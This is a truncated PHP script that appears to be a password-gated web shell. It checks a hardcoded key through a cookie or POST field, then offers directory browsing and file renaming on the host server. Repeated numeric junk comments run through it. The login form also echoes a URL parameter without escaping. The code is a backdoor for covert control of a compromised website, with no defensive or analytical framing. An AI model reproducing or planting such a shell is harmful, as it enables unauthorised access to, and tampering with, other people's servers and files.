...
$auth_key = "1dfedd34fb75831fdc599f41920e8e55";
...
$pass = false;
if (isset($_COOKIE['pw_name_86432'])) {
    if(($_COOKIE['pw_name_86432']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_86432'])) {
        if(($_POST['pw_name_86432']) == $auth_key) {
            setcookie("pw_name_86432", $_POST['pw_name_86432']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_86432' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1727305008436224 1727305008391445 1727305008379394 1727305008816012
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1727305008436224 1727305008391445 1727305008379394 1727305008816012
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1727305008436224 1727305008391445 1727305008379394 1727305008816012
            $name = PATH . "/" . $_GET['r'];
